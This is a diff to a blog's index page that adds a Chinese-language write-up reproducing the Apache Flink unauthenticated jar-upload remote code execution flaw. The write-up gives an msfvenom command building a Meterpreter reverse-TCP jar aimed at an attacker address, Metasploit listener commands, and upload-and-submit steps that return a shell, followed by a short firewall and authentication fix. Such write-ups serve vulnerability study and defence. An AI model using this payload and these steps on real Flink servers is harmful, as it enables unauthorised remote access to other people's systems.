@@ -55,6 +55,55 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
+    <article id="apache-Flink任意jar包上传导致远程代码执行" class="article global-container article-type-apache" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/12/09/Flink任意jar包上传导致远程代码执行/">Flink任意jar包上传导致远程代码执行</a>
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2019/12/09/Flink任意jar包上传导致远程代码执行/" class="article-date">
+  <time datetime="2019-12-09T04:55:27.000Z" itemprop="datePublished">2019-12-09</time>
+</a>
+    
+    
+  </div>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h4><p>2019年11月11号，安全工程师Henry Chen披露了一个Apache Flink未授权上传jar包导致远程代码执行的漏洞。由于Apache Flink Dashboard 默认无需认证即可访问,通过上传恶意jar包并触发恶意代码执行,从而获取shell。</p>
+<h3 id="msf生成jar马"><a href="#msf生成jar马" class="headerlink" title="msf生成jar马:"></a>msf生成jar马:</h3><p>(1) 利用msfvenom来生成一个jar马:</p>
+<p>msfvenom -p java/meterpreter/reverse_tcp LHOST=172.26.1.156 LPORT=9999 W &gt;text.jar</p>
+<p>(2) 打开msf的监听模块,并监听9999端口(要与我们jar马设置的端口一致)</p>
+<p>use exploit/multi/handler<br>set payload java/meterpreter/reverse_tcp<br>set LHOST your ip<br>set LPORT 9999<br>exploit</p>
+<h3 id="复现开始："><a href="#复现开始：" class="headerlink" title="复现开始："></a>复现开始：</h3><p>(1) 访问目标:<br>(2) 点击Submit new Job,可以看到其可以允许我们上传jar包</p>
+<p><img src="/apach/1.png" alt></p>
+<p>(3) 利用flink上传jar包的功能将我们的jar包上传:</p>
+<p><img src="/apach/2.png" alt></p>
+<p>(4) 上传后,我们在我们的vps上监听好端口<br>(5) 然后回到浏览器,选中我们刚刚上传的jar包,然后点击Submitting提交</p>
+<p><img src="/apach/3.png" alt></p>
+<p>(6) 可以看到我们的vps已经成功接收到了shell</p>
+<p><img src="/apach/4.png" alt></p>
+<p>漏洞修复:<br>建议设置防火墙策略，仅允许白名单ip访问 apache flink服务，并在Web代理（如apache httpd）中增加对该服务的digest认证。</p>
+
+      
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+  
     <article id="post-通过jboss反弹shell" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
@@ -304,7 +353,7 @@
   <div class="widget-box">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
     </div>
   </div>
 
@@ -314,6 +363,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/12/09/Flink任意jar包上传导致远程代码执行/">Flink任意jar包上传导致远程代码执行</a>
+          </li>
         
           <li>
             <a href="/2019/11/12/通过jboss反弹shell/">通过jboss反弹shell</a>
